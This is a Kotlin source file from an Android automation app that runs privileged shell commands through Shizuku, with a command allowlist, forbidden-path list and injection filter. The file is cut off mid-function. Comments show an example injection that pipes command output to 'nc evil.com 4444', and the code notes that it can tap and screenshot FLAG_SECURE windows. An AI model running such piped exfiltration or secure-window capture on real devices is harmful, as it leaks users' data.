package com.apk.claw.android.shizuku

import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Log
import java.io.ByteArrayOutputStream

/**
 * Shizuku Shell 服务 —— 通过 Shizuku Binder 在 shell 进程中执行命令。
 *
 * 核心原理：
 *  Shizuku 启动了一个以 shell UID (2000) 运行的 Java 进程（shizuku_server）。
 *  通过 Shizuku.bindUserService() 可以将我们的 IUserService 绑定到该进程。
 *  UserService 中的代码以 shell 身份执行，因此拥有 INJECT_EVENTS / READ_FRAME_BUFFER 等权限。
 *
 * 增益对比：
 *  - AccessibilityService.dispatchGesture() → 异步、安全窗口无效
 *  - Shizuku input tap x y → 同步、安全窗口有效
 *
 * 降级策略：
 *  所有方法在 Shizuku 不可用时返回 null / false，上层应 fallback 到 AccessibilityService。
 *
 * 安全约束（防止命令注入）：
 *  - 所有用户可控参数（路径/包名/键名/值）必须经过 [sanitizeShellArg] 转义
 *  - [exec] 入口检查整条命令是否在 [ALLOWED_COMMAND_PREFIXES] 白名单内
 *  - 任何包含 shell 元字符的字符串参数会被拒收
 */
object ShizukuShellService {

    private const val TAG = "ShizukuShell"
    private const val SHELL_TIMEOUT_MS = 10_000L

    /** 可中断的 sleep：遇到 InterruptedException 时恢复中断标志位并返回 false。 */
    private fun sleepInterruptible(ms: Long): Boolean {
        return try {
            Thread.sleep(ms)
            true
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
            false
        }
    }

    /** 允许执行的命令前缀白名单（每条命令必须以其中之一开头） */
    private val ALLOWED_COMMAND_PREFIXES = listOf(
        "input ",
        "screencap ",
        "settings ",
        "am ",
        "pm ",
        "dumpsys ",
        "uiautomator ",
        "cmd ",
        "monkey ",
        "wm ",
        "ls ",
        "stat ",
        "du ",
        "df ",
        "find ",
        "grep ",
        "cp ",
        "mv ",
        "rm ",
        "mkdir ",
        "head ",
        "cat ",
        "echo ",
        "sh -c \"cat ",  // screenshot/uiAutomatorDump 的中转读取
        "sh -c \"rm -f "  // 临时文件清理
    )

    /**
     * shell 元字符。任何用户可控字符串参数中出现以下字符即视为注入攻击，直接拒收。
     * 覆盖：分号、逻辑操作符、管道、重定向、命令替换、反引号、换行、子 shell、花括号扩展。
     */
    private val SHELL_METACHARS = charArrayOf(
        ';', '&', '|', '>', '<', '$', '`', '\n', '\r', '(', ')', '{', '}'
    )

    /** 包名合法字符：[a-zA-Z0-9_]，段间用 . 分隔 */
    private val PACKAGE_NAME_REGEX = Regex("""^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$""")

    /** 路径合法字符：字母数字 + _ / . - */
    private val PATH_SAFE_REGEX = Regex("""^/[a-zA-Z0-9_./\- ]+$""")

    /** 允许访问的路径前缀白名单（防止越权读取 /data/data、/system 等敏感目录） */
    private val ALLOWED_PATH_PREFIXES = listOf(
        "/sdcard",
        "/storage/emulated/0",
        "/data/local/tmp",
    )

    /** 命令参数中禁止出现的敏感路径模式 */
    private val FORBIDDEN_PATH_PATTERNS = listOf(
        "/data/data/",
        "/data/misc/",
        "/data/system/",
        "/system/",
        "/proc/",
    )

    /** 整数（坐标/时间/动画 scale） */
    private val INT_REGEX = Regex("""^-?\d+${'$'}""")

    /**
     * 检查字符串是否包含 shell 元字符。命中即视为潜在注入。
     */
    private fun containsShellMetachar(s: String): Boolean {
        for (c in s) if (c in SHELL_METACHARS) return true
        return false
    }

    /**
     * 转义 shell 参数：用单引号包裹并转义内部单引号。
     * 优先用此函数而不是手写字符串拼接。
     */
    fun sanitizeShellArg(value: String): String {
        require(!value.contains('\n') && !value.contains('\r')) { "arg must not contain newline" }
        return "'" + value.replace("'", "'\\''") + "'"
    }

    /** 包名校验。返回 true=合法 */
    fun isValidPackageName(name: String): Boolean = PACKAGE_NAME_REGEX.matches(name)

    /**
     * 路径校验：必须是绝对路径、只含安全字符，且位于允许访问的前缀白名单内。
     * 允许空格（部分目录名含空格），禁止路径遍历。
     */
    fun isValidPath(path: String): Boolean {
        if (!PATH_SAFE_REGEX.matches(path) || path.contains("..")) return false
        return ALLOWED_PATH_PREFIXES.any { path == it || path.startsWith("$it/") }
    }

    /**
     * 校验整条命令的"命令前缀"是否在白名单内，且不含敏感路径参数。
     * 提取逻辑：去掉行首空白后，用白名单前缀匹配；再检查参数中是否出现禁止访问的目录。
     */
    private fun isCommandAllowed(command: String): Boolean {
        val trimmed = command.trimStart()
        if (!ALLOWED_COMMAND_PREFIXES.any { trimmed.startsWith(it) }) return false
        return FORBIDDEN_PATH_PATTERNS.none { trimmed.contains(it) }
    }

    /**
     * 检测危险模式：`;`、`&&`、`||`、`|`、反引号、`$(` 出现在命令中（即使在白名单前缀内）。
     * 这些是命令注入的典型载体。单管道 `|` 同样危险：`input tap 100 200 | nc evil.com 4444`
     * 可把命令输出喂给任意程序,必须拦截。
     */
    private fun hasInjectionPattern(command: String): Boolean {
        // 去掉所有单引号包裹的内容后再检查（避免误报合法转义）
        val unquoted = command.replace(Regex("""'[^']*'"""), "")
        return unquoted.contains(";") ||
            unquoted.contains("&&") ||
            unquoted.contains("||") ||
            unquoted.contains("|") ||  // 单管道:防 input tap ... | nc evil.com
            unquoted.contains("`") ||
            unquoted.contains("$(") ||
            unquoted.contains("\${") ||  // 花括号变量扩展,不会出现在合法命令中
            unquoted.contains("\n") ||
            unquoted.contains("\r")
    }

    /**
     * 在 shell 进程中执行命令并返回输出。
     * 这是所有 shell 操作的底层基础。
     *
     * 执行路径：
     *  1. 优先使用 Shizuku.newProcess() → 在 shizuku_server 进程（shell UID 2000）中执行，
     *     拥有 INJECT_EVENTS / READ_FRAME_BUFFER / 跨用户访问等完整 shell 权限
     *  2. newProcess 不可用时显式降级（见 [UnprivilegedShellFallback]）：需要 shell 权限的命令直接返回错误；
     *     文件类命令以 app UID 执行，结果 privileged=false 且 stderr 注明
     *
     * @param command shell 命令（必须以白名单前缀开头，否则返回 blocked 结果）
     * @return ShellResult 包含 exitCode 和 stdout/stderr，Shizuku 不可用时返回 null
     */
    fun exec(command: String): ShellResult? {
        if (!ShizukuManager.isAvailable()) {
            Log.d(TAG, "Shizuku not available, cannot exec: $command")
            return null
        }

        if (!isCommandAllowed(command)) {
            Log.w(TAG, "Blocked non-whitelisted command: $command")
            return ShellResult(
                exitCode = -1,
                stdout = "",
                stderr = "Command blocked: not in whitelist"
            )
        }

        if (hasInjectionPattern(command)) {
            Log.w(TAG, "Blocked injection pattern: $command")
            return ShellResult(
                exitCode = -1,
                stdout = "",
                stderr = "Command blocked: injection pattern detected"
            )
        }

        return execRaw(command)
    }

    /**
     * 内部硬编码命令执行通道:跳过 [hasInjectionPattern] 检测,仅供本文件内
     * 无用户输入拼接的固定命令使用(如 `dumpsys ... | grep ...`)。
     * 仍走 [isCommandAllowed] 白名单,保证前缀可控。
     * 公开入口 [exec] 始终带注入检测,外部不可信输入必须走 exec。
     */
    private fun execInternal(command: String): ShellResult? {
        if (!ShizukuManager.isAvailable()) return null
        if (!isCommandAllowed(command)) {
            Log.w(TAG, "Blocked non-whitelisted internal command: $command")
            return ShellResult(-1, "", "Command blocked: not in whitelist")
        }
        return execRaw(command)
    }

    private fun execRaw(command: String): ShellResult? = try {
        val cmd = arrayOf("sh", "-c", command)
        val process = createShizukuProcess(cmd)
        if (process != null) {
            readProcessOutput(process, command)
        } else {
            execWithoutShizuku(cmd, command)
        }
    } catch (e: Exception) {
        Log.e(TAG, "exec failed: $command", e)
        null
    }

    /**
     * Shizuku 进程不可用时的显式降级：需要 shell 权限的命令直接拒绝；
     * 其余命令以 app UID 执行，结果标记为 privileged=false 并在 stderr 中注明。
     */
    private fun execWithoutShizuku(cmd: Array<String>, command: String): ShellResult {
        if (UnprivilegedShellFallback.requiresElevation(command)) {
            Log.e(TAG, "Shizuku process unavailable, refusing privileged command: $command")
            return UnprivilegedShellFallback.refused()
        }
        Log.w(TAG, "Shizuku process unavailable, running WITHOUT shell privileges (app UID): $command")
        val process = Runtime.getRuntime().exec(cmd)
        return UnprivilegedShellFallback.markUnprivileged(readProcessOutput(process, command))
    }

    /**
     * 通过 Shizuku.newProcess()（shell UID）创建子进程；不可用时返回 null（不再静默回退到 app UID）。
     * newProcess() 在 Shizuku API 13 中被标记为 hidden，但仍可通过反射调用。
     */
    private fun createShizukuProcess(cmd: Array<String>): Process? {
        return try {
            val method = rikka.shizuku.Shizuku::class.java.getDeclaredMethod(
                "newProcess", Array<String>::class.java, Array<String>::class.java, String::class.java
            )
            method.isAccessible = true
            method.invoke(null, cmd, null, null) as Process
        } catch (e: Exception) {
            try {
                val method = rikka.shizuku.Shizuku::class.java.getDeclaredMethod(
                    "newProcess", Array<String>::class.java, Array<String>::class.java, String::class.java, Array<String>::class.java
                )
                method.isAccessible = true
                method.invoke(null, cmd, null, null, null) as Process
            } catch (e2: Exception) {
                Log.w(TAG, "Shizuku.newProcess unavailable (${e.message}; ${e2.message})")
                null
            }
        }
    }

    /**
     * 读取进程输出流/错误流，等待进程完成（带超时），返回 ShellResult。
     */
    private fun readProcessOutput(process: Process, command: String): ShellResult {
        val stdout = ByteArrayOutputStream()
        val stderr = ByteArrayOutputStream()

        val stdoutThread = Thread {
            try {
                process.inputStream.use { input ->
                    val buffer = ByteArray(4096)
                    var len: Int
                    while (input.read(buffer).also { len = it } != -1) {
                        stdout.write(buffer, 0, len)
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "stdout read failed", e)
            }
        }

        val stderrThread = Thread {
            try {
                process.errorStream.use { error ->
                    val buffer = ByteArray(4096)
                    var len: Int
                    while (error.read(buffer).also { len = it } != -1) {
                        stderr.write(buffer, 0, len)
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "stderr read failed", e)
            }
        }

        stdoutThread.start()
        stderrThread.start()

        val finished = process.waitFor(SHELL_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS)
        if (!finished) {
            process.destroyForcibly()
            stdoutThread.join(500)
            stderrThread.join(500)
            Log.w(TAG, "Command timed out: $command")
            return ShellResult(-1, "", "Command timed out after ${SHELL_TIMEOUT_MS}ms")
        }

        stdoutThread.join(1000)
        stderrThread.join(1000)

        return ShellResult(
            exitCode = process.exitValue(),
            stdout = stdout.toString(Charsets.UTF_8.name()),
            stderr = stderr.toString(Charsets.UTF_8.name())
        )
    }

    // ======================== 触控操作 ========================

    /**
     * Shell 级点击 —— 通过 `input tap x y` 注入触摸事件。
     * 相比 AccessibilityService.dispatchGesture()，此方法：
     *  - 同步执行，无回调延迟
     *  - 安全窗口（FLAG_SECURE）也能点击
     *
     * @return true=命令执行成功（exitCode=0），null=Shizuku 不可用
     */
    fun tap(x: Int, y: Int): Boolean? {
        val result = exec("input tap $x $y") ?: return null
        return result.exitCode == 0
    }

    /**
     * Shell 级滑动 —— 通过 `input swipe x1 y1 x2 y2 duration` 注入滑动手势。
     */
    fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, durationMs: Long = 300): Boolean? {
        val result = exec("input swipe $x1 $y1 $x2 $y2 $durationMs") ?: return null
        return result.exitCode == 0
    }

    /**
     * Shell 级长按 —— swipe 的 duration 加长版本。
     */
    fun longPress(x: Int, y: Int, durationMs: Long = 1000): Boolean? {
        val result = exec("input swipe $x $y $x $y $durationMs") ?: return null
        return result.exitCode == 0
    }

    // ======================== 按键注入 ========================

    /**
     * Shell 级按键 —— 通过 `input keyevent` 注入按键事件。
     * 修复了普通 App UID 执行 input keyevent 在手机上被 SELinux 拒绝的问题。
     *
     * @param keyCode Android KeyEvent 常量值（如 KEYCODE_BACK=4, KEYCODE_HOME=3）
     */
    fun keyEvent(keyCode: Int): Boolean? {
        val result = exec("input keyevent $keyCode") ?: return null
        return result.exitCode == 0
    }

    // ======================== 屏幕截图 ========================

    /**
     * Shell 级截屏 —— 通过 `screencap -p` 命令截取屏幕，直接读取 stdout 二进制。
     * 相比 AccessibilityService.takeScreenshot()：
     *  - Android 9/10 也能使用
     *  - 安全窗口（FLAG_SECURE）能截到真实内容
     *  - 以 shell UID 执行，无 app 进程权限限制
     *
     * @return 截图 Bitmap，Shizuku 不可用或截屏失败时返回 null
     */
    fun screenshot(): Bitmap? {
        return try {
            val bytes = execBinary("screencap -p") ?: return null
            if (bytes.isEmpty()) {
                Log.e(TAG, "screencap returned empty bytes")
                return null
            }
            BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
        } catch (e: Exception) {
            Log.e(TAG, "screenshot failed", e)
            null
        }
    }

    /**
     * 执行命令并将 stdout 作为原始字节返回（用于截屏等二进制输出场景）。
     * 命令安全检查与 [exec] 一致。
     */
    private fun execBinary(command: String): ByteArray? {
        if (!ShizukuManager.isAvailable()) {
            Log.d(TAG, "Shizuku not available, cannot execBinary: $command")
            return null
        }
        if (!isCommandAllowed(command)) {
            Log.w(TAG, "Blocked non-whitelisted command: $command")
            return null
        }
        if (hasInjectionPattern(command)) {
            Log.w(TAG, "Blocked injection pattern: $command")
            return null
        }

        return try {
            // 二进制命令（screencap）只有 shell 权限下才有意义：Shizuku 进程不可用时直接失败，不降级到 app UID
            val process = createShizukuProcess(arrayOf("sh", "-c", command)) ?: run {
                Log.e(TAG, "Shizuku process unavailable, refusing privileged binary command: $command")
                return null
            }
            val stdout = java.util.concurrent.ArrayBlockingQueue<ByteArray?>(1)

            val readerThread = Thread {
                try {
                    val raw = process.inputStream.use { it.readBytes() }
                    stdout.offer(raw)
                } catch (e: Exception) {
                    Log.w(TAG, "binary stdout read failed", e)
                    stdout.offer(null)
                }
                // drain stderr to prevent process blocking
                try { process.errorStream.use { it.copyTo(ByteArrayOutputStream()) } } catch (_: Exception) {}
            }
            readerThread.start()

            val finished = process.waitFor(SHELL_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS)
            if (!finished) {
                process.destroyForcibly()
                readerThread.join(500)
                Log.w(TAG, "Binary command timed out: $command")
                return null
            }
            readerThread.join(1000)

            val exitCode = process.exitValue()
            if (exitCode != 0) {
                Log.w(TAG, "Binary command exited with $exitCode: $command")
                return null
            }
            stdout.poll()
        } catch (e: Exception) {
            Log.e(TAG, "execBinary failed: $command", e)
            null
        }
    }

    // ======================== 系统设置 ========================

    /**
     * 修改系统设置 —— 通过 `settings put` 命令。
     *
     * 常用场景：
     *  - 关闭动画（提速 30-50%）：
     *    putSetting("global", "window_animation_scale", "0")
     *    putSetting("global", "transition_animation_scale", "0")
     *    putSetting("global", "animator_duration_scale", "0")
     *  - 屏幕常亮：
     *    putSetting("system", "screen_off_timeout", "2147483647")
     *
     * @param namespace "system" / "secure" / "global"
     */
    fun putSetting(namespace: String, key: String, value: String): Boolean? {
        val ns = when (namespace.lowercase()) {
            "system", "secure", "global" -> namespace.lowercase()
            else -> return false
        }
        // 命令注入防护：key 限白名单字符，value（可含任意内容）单引号转义。
        if (!key.matches(Regex("""^[a-zA-Z0-9_.:]+$"""))) {
            Log.w(TAG, "Invalid setting key: $key")
            return false
        }
        if (value.contains('\n') || value.contains('\r')) {
            Log.w(TAG, "Invalid setting value")
            return false
        }
        val result = exec("settings put $ns $key ${sanitizeShellArg(value)}") ?: return null
        return result.exitCode == 0
    }

    /**
     * 读取系统设置。
     */
    fun getSetting(namespace: String, key: String): String? {
        val ns = when (namespace.lowercase()) {
            "system", "secure", "global" -> namespace.lowercase()
            else -> return null
        }
        val result = exec("settings get $ns $key") ?: return null
        return if (result.exitCode == 0) result.stdout.trim() else null
    }

    // ======================== 应用管理 ========================

    /**
     * 强制停止应用 —— 通过 `am force-stop` 命令。
     * 用于任务失败后清理 App 状态再重试。
     */
    fun forceStop(packageName: String): Boolean? {
        if (!isValidPackageName(packageName)) {
            Log.w(TAG, "Invalid package name: $packageName")
            return false
        }
        val safePkg = sanitizeShellArg(packageName)
        val result = exec("am force-stop $safePkg") ?: return null
        return result.exitCode == 0
    }

    /**
     * 清除应用数据 —— 通过 `pm clear` 命令。
     * 将 App 重置到初始状态。
     */
    fun clearAppData(packageName: String): Boolean? {
        if (!isValidPackageName(packageName)) {
            Log.w(TAG, "Invalid package name: $packageName")
            return false
        }
        val safePkg = sanitizeShellArg(packageName)
        val result = exec("pm clear $safePkg") ?: return null
        return result.exitCode == 0 && result.stdout.contains("Success")
    }

    /**
     * 获取当前前台 Activity 信息 —— 通过 `dumpsys activity` 命令。
     * 比 AccessibilityService 获取的窗口信息更准确。
     *
     * @return 前台 Activity 信息字符串，如 "com.tencent.mm/.ui.LauncherUI"
     */
    fun getTopActivity(): String? {
        val result = execInternal("dumpsys activity activities | grep mResumedActivity") ?: return null
        if (result.exitCode != 0) return null

        // 输出格式: "mResumedActivity: ActivityRecord{...} com.tencent.mm/.ui.LauncherUI t123}"
        val line = result.stdout.trim()
        val regex = Regex("""([a-zA-Z0-9_.]+/[a-zA-Z0-9_.]+)""")
        return regex.find(line)?.value
    }

    /**
     * UI Automator dump —— 获取完整 UI 层级 XML。
     * 当 AccessibilityService 返回的 UI 树不完整时可用作 fallback。
     *
     * @return UI 层级 XML 字符串，失败返回 null
     */
    fun uiAutomatorDump(): String? {
        val tempName = "octopus_ui_dump_${System.currentTimeMillis()}.xml"
        val tempPath = "/sdcard/$tempName"
        try {
            val dumpResult = exec("uiautomator dump $tempPath") ?: return null
            if (dumpResult.exitCode != 0) return null

            val safeTempPath = sanitizeShellArg(tempPath)
            val readResult = exec("cat $safeTempPath")
            exec("rm -f $safeTempPath")
            return readResult?.stdout?.ifEmpty { null }
        } catch (e: Exception) {
            Log.e(TAG, "uiAutomatorDump failed", e)
            return null
        }
    }

    // ======================== 动画控制（快捷方法）========================

    /**
     * 关闭系统动画 —— 任务执行前调用可提速 30-50%。
     */
    fun disableAnimations(): Boolean {
        val r1 = putSetting("global", "window_animation_scale", "0") ?: return false
        val r2 = putSetting("global", "transition_animation_scale", "0") ?: return false
        val r3 = putSetting("global", "animator_duration_scale", "0") ?: return false
        return r1 && r2 && r3
    }

    /**
     * 恢复系统动画。
     */
    fun enableAnimations(): Boolean {
        val r1 = putSetting("global", "window_animation_scale", "1") ?: return false
        val r2 = putSetting("global", "transition_animation_scale", "1") ?: return false
        val r3 = putSetting("global", "animator_duration_scale", "1") ?: return false
        return r1 && r2 && r3
    }

    // ======================== 窗口管理（Extendroid 式多窗口）========================

    /**
     * 以 freeform（自由窗口）模式启动应用。
     *
     * 参考 Extendroid 实现思路，通过 `am start --windowingMode 5` 启动弹窗模式。
     * windowingMode 5 = WINDOWING_MODE_FREEFORM（桌面式多窗口）
     *
     * @param packageName 应用包名
     * @param x 窗口左上角 X 坐标（像素）
     * @param y 窗口左上角 Y 坐标（像素）
     * @param width 窗口宽度（像素）
     * @param height 窗口高度（像素）
     * @return true=启动成功，null=Shizuku 不可用
     */
    fun launchFreeform(packageName: String, x: Int, y: Int, width: Int, height: Int): Boolean? {
        if (!isValidPackageName(packageName)) {
            Log.w(TAG, "Invalid package name: $packageName")
            return false
        }
        val safePkg = sanitizeShellArg(packageName)
        // 先获取 launch intent
        val intentResult = exec("cmd package resolve-activity --brief $safePkg") ?: return null

        // 构造 am start 命令，使用 --windowingMode 5 (freeform)
        // --launchDisplayId 0 = 主屏幕
        // --task "packageName" = 新任务
        val cmd = buildString {
            append("am start -n ")
            // 解析 activity 组件名
            val activityLine = intentResult.stdout.lines()
                .lastOrNull { it.contains("/") }
                ?.trim()

            if (activityLine != null) {
                append(activityLine)
            } else {
                // fallback: 使用 monkey 启动
                val safePkg = sanitizeShellArg(packageName)
                exec("monkey -p $safePkg -c android.intent.category.LAUNCHER 1")
                return@buildString
            }
            append(" --windowingMode 5")
            append(" --launchDisplayId 0")
        }

        val result = exec(cmd) ?: return null
        if (result.exitCode != 0) {
            Log.e(TAG, "launchFreeform failed: ${result.stderr}")
            return false
        }

        // 等待窗口创建，然后调整大小和位置
        if (!sleepInterruptible(500)) return false
        resizeTopTask(x, y, width, height)
        return true
    }

    /**
     * 在指定显示器上以 freeform 模式启动应用。
     *
     * 与 launchFreeform() 的区别是支持指定 displayId：
     *  - displayId=0 → 主屏幕（手机屏）
     *  - displayId>0 → 外接显示器（通过 USB-C/HDMI/无线投屏）
     *
     * 通过 `--launchDisplayId <id>` 参数将 App 启动到指定屏幕。
     *
     * @param displayId 目标显示器 ID（通过 ExternalDisplayManager 获取）
     */
    fun launchFreeformOnDisplay(
        packageName: String,
        displayId: Int,
        x: Int = 100,
        y: Int = 100,
        width: Int = 800,
        height: Int = 600
    ): Boolean? {
        if (!isValidPackageName(packageName)) {
            Log.w(TAG, "Invalid package name: $packageName")
            return false
        }
        val safePkg = sanitizeShellArg(packageName)
        val intentResult = exec("cmd package resolve-activity --brief $safePkg") ?: return null

        val cmd = buildString {
            append("am start -n ")
            val activityLine = intentResult.stdout.lines()
                .lastOrNull { it.contains("/") }
                ?.trim()

            if (activityLine != null) {
                append(activityLine)
            } else {
                val safePkg = sanitizeShellArg(packageName)
                exec("monkey -p $safePkg -c android.intent.category.LAUNCHER 1")
                return@buildString
            }
            append(" --windowingMode 5")
            append(" --launchDisplayId $displayId")
        }

        val result = exec(cmd) ?: return null
        if (result.exitCode != 0) {
            Log.e(TAG, "launchFreeformOnDisplay failed: ${result.stderr}")
            return false
        }

        if (!sleepInterruptible(500)) return false
        resizeTopTask(x, y, width, height)
        return true
    }

    /**
     * 调整当前最顶层任务窗口的大小和位置。
     *
     * 通过 `am task resize` 命令实现。
     *
     * @param x 窗口左上角 X
     * @param y 窗口左上角 Y
     * @param width 窗口宽度
     * @param height 窗口高度
     */
    fun resizeTopTask(x: Int, y: Int, width: Int, height: Int): Boolean? {
        // 获取当前最顶层 task ID
        val taskId = getTopTaskId() ?: return null

        // am task resize <taskId> <left> <top> <right> <bottom>
        val right = x + width
        val bottom = y + height
        val result = exec("am task resize $taskId $x $y $right $bottom") ?: return null
        return result.exitCode == 0
    }

    /**
     * 移动指定任务窗口到新位置。
     *
     * @param taskId 任务 ID（-1 表示最顶层任务）
     * @param x 新位置 X
     * @param y 新位置 Y
     */
    fun moveTask(taskId: Int, x: Int, y: Int, width: Int = 800, height: Int = 1200): Boolean? {
        val actualTaskId = if (taskId < 0) getTopTaskId() ?: return null else taskId
        val right = x + width
        val bottom = y + height
        val result = exec("am task resize $actualTaskId $x $y $right $bottom") ?: return null
        return result.exitCode == 0
    }

    /**
     * 获取当前最顶层任务的 ID。
     */
    private fun getTopTaskId(): Int? {
        val result = execInternal("dumpsys activity activities | grep -E 'taskId=|topResumedActivity'")
            ?: return null
        if (result.exitCode != 0) return null

        // 解析输出，找到最顶层的 taskId
        val lines = result.stdout.lines()
        for (line in lines.reversed()) {
            val match = Regex("""taskId=(\d+)""").find(line)
            if (match != null) {
                return match.groupValues[1].toIntOrNull()
            }
        }
        return null
    }

    /**
     * 获取所有正在运行的任务列表。
     *
     * @return 任务列表字符串（每行一个任务，格式：taskId packageName）
     */
    fun getRunningTasks(): String? {
        val result = execInternal("dumpsys activity activities | grep -E 'taskId=|packageName'")
            ?: return null
        if (result.exitCode != 0) return null
        return result.stdout.trim()
    }

    /**
     * 将指定任务最小化（移到后台但保持运行）。
     */
    fun minimizeTask(taskId: Int): Boolean? {
        val actualTaskId = if (taskId < 0) getTopTaskId() ?: return null else taskId
        // 通过发送 HOME 键 + 任务 resize 实现最小化
        val result = exec("am task resize $actualTaskId 0 0 1 1") ?: return null
        return result.exitCode == 0
    }

    /**
     * 将任务恢复为全屏模式。
     */
    fun restoreFullscreen(taskId: Int): Boolean? {
        val actualTaskId = if (taskId < 0) getTopTaskId() ?: return null else taskId
        // windowingMode 1 = WINDOWING_MODE_FULLSCREEN
        val result = exec("am task windowingMode $actualTaskId 1") ?: return null
        return result.exitCode == 0
    }

    /**
     * 获取屏幕分辨率。
     *
     * @return Pair(width, height)，Shizuku 不可用时返回 null
     */
    fun getScreenSize(): Pair<Int, Int>? {
        val result = exec("wm size") ?: return null
        if (result.exitCode != 0) return null
        // 输出格式: "Physical size: 1080x2400"
        val match = Regex("""(\d+)x(\d+)""").find(result.stdout)
        if (match != null) {
            val width = match.groupValues[1].toIntOrNull() ?: return null
            val height = match.groupValues[2].toIntOrNull() ?: return null
            return Pair(width, height)
        }
        return null
    }

    // ======================== 文件管理（AI NAS）========================

    /**
     * 列出目录内容。
     *
     * shell UID 可以访问 /sdcard/ 和 /sdcard/Android/data/ 下所有目录。
     * 普通 App 在 Android 11+ 的 Scoped Storage 下无法访问其他 App 的 data 目录。
     *
     * @param path 目录路径（如 /sdcard/Download）
     * @return ls -la 输出，Shizuku 不可用时返回 null
     */
    fun listFiles(path: String, showHidden: Boolean = false): String? {
        if (!isValidPath(path)) {
            Log.w(TAG, "Invalid path: $path")
            return "Error: invalid path"
        }
        val flags = if (showHidden) "-lah" else "-lh"
        val safePath = sanitizeShellArg(path)
        val result = exec("ls $flags $safePath") ?: return null
        if (result.exitCode != 0) {
            return "Error: ${result.stderr.trim()}"
        }
        return result.stdout.trim()
    }

    /**
     * 获取文件/目录的详细信息。
     *
     * @param path 文件或目录路径
     * @return stat 输出（大小、权限、修改时间等）
     */
    fun getFileInfo(path: String): String? {
        if (!isValidPath(path)) {
            Log.w(TAG, "Invalid path: $path")
            return "Error: invalid path"
        }
        val safePath = sanitizeShellArg(path)
        val result = exec("stat $safePath") ?: return null
        if (result.exitCode != 0) {
            return "Error: ${result.stderr.trim()}"
        }
        return result.stdout.trim()
    }

    /**
     * 计算目录占用空间。
     *
     * @param path 目录路径
     * @return du -sh 输出（如 "2.3G /sdcard/Android/data/com.tencent.mm"）
     */
    fun getDirectorySize(path: String): String? {
        if (!isValidPath(path)) {
            Log.w(TAG, "Invalid path: $path")
            return null
        }
        val safePath = sanitizeShellArg(path)
        val result = exec("du -sh $safePath") ?: return null
        if (result.exitCode != 0) return null
        return result.stdout.trim()
    }

    /**
     * 搜索文件 —— 按文件名模式搜索。
     *
     * @param basePath 搜索根目录
     * @param pattern 文件名模式（支持通配符，如 "*.jpg"、"*.pdf"）
     * @param maxResults 最大返回数量
     * @return 匹配的文件路径列表
     */
    fun searchFiles(basePath: String, pattern: String, maxResults: Int = 50): String? {
        if (!isValidPath(basePath)) {
            Log.w(TAG, "Invalid basePath: $basePath")
            return "Error: invalid path"
        }
        if (!INT_REGEX.matches(maxResults.toString())) return null
        // 限制 pattern 字符：字母数字 + _ . * ? []
        if (!pattern.matches(Regex("""[a-zA-Z0-9_.?*\[\]-]+"""))) {
            Log.w(TAG, "Invalid pattern: $pattern")
            return "Error: invalid pattern"
        }
        val safeBase = sanitizeShellArg(basePath)
        val safePattern = sanitizeShellArg(pattern)
        val result = execInternal("find $safeBase -name $safePattern -type f 2>/dev/null | head -n $maxResults")
            ?: return null
        if (result.exitCode != 0 && result.stderr.isNotEmpty()) {
            return "Error: ${result.stderr.trim()}"
        }
        return result.stdout.trim()
    }

    /**
     * 按文件内容搜索（grep）。
     *
     * @param basePath 搜索根目录
     * @param text 要搜索的文本
     * @param filePattern 文件类型过滤（如 "*.txt"、"*.log"）
     * @param maxResults 最大返回数量
     */
    fun searchByContent(basePath: String, text: String, filePattern: String = "*", maxResults: Int = 20): String? {
        // 命令注入防护：basePath/filePattern 走白名单校验，text（完全用户可控）走单引号转义。
        if (!isValidPath(basePath)) {
            Log.w(TAG, "Invalid basePath: $basePath")
            return "Error: invalid path"
        }
        if (!filePattern.matches(Regex("""[a-zA-Z0-9_.?*\[\]-]+"""))) {
            Log.w(TAG, "Invalid filePattern: $filePattern")
            return "Error: invalid pattern"
        }
        if (text.isEmpty() || text.contains('\n') || text.contains('\r')) {
            Log.w(TAG, "Invalid search text")
            return "Error: invalid search text"
        }
        if (!INT_REGEX.matches(maxResults.toString())) return null
        val safeText = sanitizeShellArg(text)
        val safeBase = sanitizeShellArg(basePath)
        val safePattern = sanitizeShellArg(filePattern)
        val result = execInternal("grep -rl $safeText $safeBase --include=$safePattern 2>/dev/null | head -n $maxResults")
            ?: return null
        return result.stdout.trim()
    }

    /**
     * 查找重复文件（基于文件大小和名称）。
     *
     * @param basePath 扫描根目录
     * @param minSizeMB 最小文件大小（MB），忽略太小的文件
     * @return 重复文件列表
     */
    fun findDuplicateFiles(basePath: String, minSizeMB: Int = 1): String? {
        if (!isValidPath(basePath)) {
            Log.w(TAG, "Invalid basePath: $basePath")
            return "Error: invalid path"
        }
        if (!INT_REGEX.matches(minSizeMB.toString())) return null
        // 用 sanitizeShellArg 转义 basePath,避免字符串插值(纵深防御)
        val safeBase = sanitizeShellArg(basePath)
        // 用 xargs 替代 -exec ... \;，避免分号被自家注入过滤器拦截
        val cmd = "find $safeBase -type f -size +${minSizeMB}M 2>/dev/null | xargs ls -l 2>/dev/null | awk '{print \$5, \$9}' | sort -n | uniq -d -w 20 | head -n 30"
        val result = execInternal(cmd) ?: return null
        return result.stdout.trim().ifEmpty { "No duplicate files found." }
    }

    /**
     * 复制文件。
     */
    fun copyFile(src: String, dst: String): Boolean? {
        if (!isValidPath(src) || !isValidPath(dst)) {
            Log.w(TAG, "Invalid path: src=$src, dst=$dst")
            return false
        }
        val safeSrc = sanitizeShellArg(src)
        val safeDst = sanitizeShellArg(dst)
        val result = exec("cp -r $safeSrc $safeDst") ?: return null
        return result.exitCode == 0
    }

    /**
     * 移动/重命名文件。
     */
    fun moveFile(src: String, dst: String): Boolean? {
        if (!isValidPath(src) || !isValidPath(dst)) {
            Log.w(TAG, "Invalid path: src=$src, dst=$dst")
            return false
        }
        val safeSrc = sanitizeShellArg(src)
        val safeDst = sanitizeShellArg(dst)
        val result = exec("mv $safeSrc $safeDst") ?: return null
        return result.exitCode == 0
    }

    /**
     * 删除文件。
     */
    fun deleteFile(path: String): Boolean? {
        if (!isValidPath(path)) {
            Log.w(TAG, "Invalid path: $path")
            return false
        }
